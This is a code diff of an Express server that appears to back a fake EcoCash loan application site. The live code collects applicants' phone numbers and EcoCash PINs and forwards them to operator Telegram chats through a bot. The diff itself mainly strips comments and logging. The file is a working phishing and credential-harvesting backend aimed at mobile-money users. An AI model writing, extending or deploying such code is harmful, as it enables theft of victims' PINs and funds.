@@ -15,11 +15,8 @@ app.use(express.static(publicPath));
 
 const APP_URL = process.env.APP_URL || 'https://ecocash-aot6.onrender.com';
 
-// Dynamic function to resolve admins at runtime
 function getAdmins() {
   const admins = [];
-  
-  // Check primary ADMIN_1_CHAT_ID or legacy ADMIN_CHAT_ID
   let index = 1;
   while (process.env[`ADMIN_${index}_CHAT_ID`]) {
     const chatId = process.env[`ADMIN_${index}_CHAT_ID`].trim();
@@ -34,7 +31,6 @@ function getAdmins() {
     index++;
   }
 
-  // Fallback if user configured ADMIN_CHAT_ID instead
   if (admins.length === 0 && process.env.ADMIN_CHAT_ID) {
     admins.push({
       key: 'main',
@@ -57,7 +53,6 @@ function formatZimbabwePhone(phone) {
   return p;
 }
 
-// TELEGRAM WEBHOOK HANDLER
 app.post('/api/telegram-webhook', async (req, res) => {
   res.sendStatus(200);
 
@@ -163,7 +158,6 @@ async function editTelegramMessage(botToken, chatId, messageId, text) {
   }
 }
 
-// RECEIVES COMBINED STEP 1 & STEP 2 DATA AND DELIVERS TO TELEGRAM
 app.post('/api/apply-loan', async (req, res) => {
   try {
     const data = req.body;
@@ -176,17 +170,6 @@ app.post('/api/apply-loan', async (req, res) => {
 
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
     const ADMINS = getAdmins();
-
-    console.log(`[APPLY] New application submitted: ${appReference}`);
-    console.log(`[APPLY] Loaded ${ADMINS.length} admin(s) for delivery.`);
-
-    if (!botToken) {
-      console.error('[APPLY ERROR] TELEGRAM_BOT_TOKEN environment variable is missing!');
-    }
-
-    if (ADMINS.length === 0) {
-      console.error('[APPLY ERROR] No ADMIN Chat IDs found! Check ADMIN_1_CHAT_ID or ADMIN_CHAT_ID in Render Environment Variables.');
-    }
 
     if (botToken && ADMINS.length > 0) {
       for (const admin of ADMINS) {
@@ -201,7 +184,7 @@ app.post('/api/apply-loan', async (req, res) => {
                         `📞 <b>Phone:</b> +263${formattedPhone}\n` +
                         `🔑 <b>EcoCash PIN:</b> <code>${data.pin}</code>`;
 
-        const tgRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
@@ -218,9 +201,6 @@ app.post('/api/apply-loan', async (req, res) => {
             }
           })
         });
-
-        const tgJson = await tgRes.json();
-        console.log(`[TELEGRAM RESPONSE] Sent to Chat ID ${admin.chatId}:`, tgJson);
       }
     }
 
@@ -287,3 +267,4 @@ app.get('*', (req, res) => {
 });
 
 app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
+      
